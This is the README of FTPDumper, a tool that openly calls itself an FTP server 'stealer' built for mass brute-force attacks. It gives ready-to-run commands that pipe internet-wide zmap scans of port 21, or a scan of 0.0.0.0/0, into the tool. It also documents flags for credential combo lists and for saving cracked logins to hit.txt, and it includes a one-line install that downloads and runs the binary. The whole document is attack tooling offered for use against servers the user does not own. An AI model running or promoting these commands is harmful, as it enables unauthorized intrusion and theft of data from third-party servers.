<p align="center"><img src="https://i.ibb.co/TR8ZCyn/New-Project.png" width="256" alt="logo"></p>
<h1 align="center">FTPDumper - An FTP Servers Stealer</h1>


<p align="center">
<img alt="FTPDumper forks" src="https://img.shields.io/github/forks/MatrixTM/FTPDumper?style=for-the-badge">
<img alt="GitHub Repo stars" src="https://img.shields.io/github/stars/MatrixTM/FTPDumper?style=for-the-badge">
<br>
<!-- <img alt="GitHub Downloads" src="https://img.shields.io/github/downloads/MatrixTM/FTPDumper/FTPDumper?style=social&color=07c1f0"> -->
<p align="center">
 <img src="https://views.whatilearened.today/views/github/MatrixTM/FTPDumper.svg" width="80px" height="28px" alt="View">
</p>

___

<p align="center"><img src="https://i.imgur.com/H39uBH3.png" width="1040" alt="features"></p>

## 📖 What is FTPDumper ?

FTPDumper is an easy-to-use yet advanced FTP server file stealer.
It can be utilized in massive FTP brute-force attacks, supporting various formats such as combo, pipe input, CIDR, files, and even a single IP address.

FTPDumper boasts a plethora of features, including:
- 💡 **Anti-Fake File Detection**: Utilizes advanced algorithms to detect and prevent the extraction of counterfeit files.
- 🔍 **Self-Implemented Scanner**: Employs an internally developed scanning mechanism to ensure thoroughness and efficiency.
- 🖥️ **Modern and Sleek User Interface**: Offers a visually appealing and user-friendly interface for seamless navigation and operation.
- ⚡ **Fast and Memory-Safe Operation**: Executes operations swiftly while maintaining optimal memory usage to prevent system slowdowns or crashes.
- 🤝 **Smart Connection and Timeout Management**: Implements intelligent connection strategies and timeout configurations to maximize accuracy and resource utilization.

###### Use it at your own RISK!


## 🔍 Overview

- 🚀 [Quickstart](#-quickstart)
- ⚙️ [Arguments](#%EF%B8%8F-arguments)
- 👨‍💻 [Best Way to get a server](#-best-way-to-get-a-server)

# 🚀 Quickstart

---

#### One-Line Install And Running on Fresh VPS
```bash
apt update && apt install -y zmap && wget -q $(curl -s https://api.github.com/repos/MatrixTM/FTPDumper/releases/latest | grep browser_download_url | grep "FTPDumper" | cut -d '"' -f 4) && chmod +x FTPDumper && zmap -p 21 -B 50MB -q | ./FTPDumper -l 5000
```

<details>
 <summary><b>🔧 Manual Installation</b></summary>
<h3> 1. Download FTPDumper </h3>
<p>Download FTPDumper from <a href="https://github.com/MatrixTM/FTPDumper/releases">Releases</a></p>

<h3> 2. Set Up Permission </h3>

Set up permission to FTPDumper binary file.
```bash
chmod +x FTPDumper
```

<h3> 3. Run FTPDumper </h3>

You have a few ways to use FTPDumper.

- Zmap
  - Download Zmap
  ```bash
  sudo apt install zmap
  ```
  - Run FTPDumper (Zmap)
  ```bash
  zmap -p 21 -q | ./FTPDumper -l 500 -save
  ```
  - Run FTPDumper (DevWay)
  ```bash
  ./FTPDumper -l 500 -save -s 0.0.0.0/0
  ```
  Check out [Arguments](#-arguments) to see more
</details>

---

# ⚙️ Arguments

```bash
MatrixTM@FTPDumper: ./FTPDumper --help
FTPDumper - Scan World FTP Servers and Steal Their Data

  Flags:
       --version   Displays the program version string.
    -h --help      Displays help with available flag, subcommand, and positional value parameters.
    -scan --scanner   Ip/CIDR scanner (stdin|filename|cidr|ip) (default: stdin)
    -c --combo     Combo File (user:password)
    -p --ports     Ports Split by , (Default Port: 21)
    -o --output    Output Folder (default: files)
    -f --formats   File Formats Split by , (Default Format: all)
    -l --limit     Task limit (default: 10)
    -t --timeout   Timeout in seconds (default: 5s)
    -s --save      Save Credentials in hit.txt
    -v --verbose   Verbose Mode
```

| Argument         | Description                                                                     | Default Value |
|------------------|---------------------------------------------------------------------------------|:-------------:|
| --version        | Displays the program version string.                                            |     None      |
| -h, --help       | Displays help with available flag, subcommand, and positional value parameters. |     None      |
| -scan, --scanner | IP/CIDR scanner [stdin\|filename\|cidr\|ip] stdin                               |     stdin     |
| -c, --combo      | Combo File (user:password)                                                      |   anonymous   |
| -p, --ports      | Ports Split by ,                                                                |      21       |
| -o, --output     | Output Folder files                                                             |     files     |
| -f, --formats    | File Formats Split by ,                                                         |      all      |
| -l, --limit      | Task limit                                                                      |      10       |
| -t, --timeout    | Timeout in seconds                                                              |      5s       |
| -s, --save       | Save Credentials in hit.txt                                                     |     False     |
| -v, --verbose    | Verbose Mode                                                                    |     False     |
---
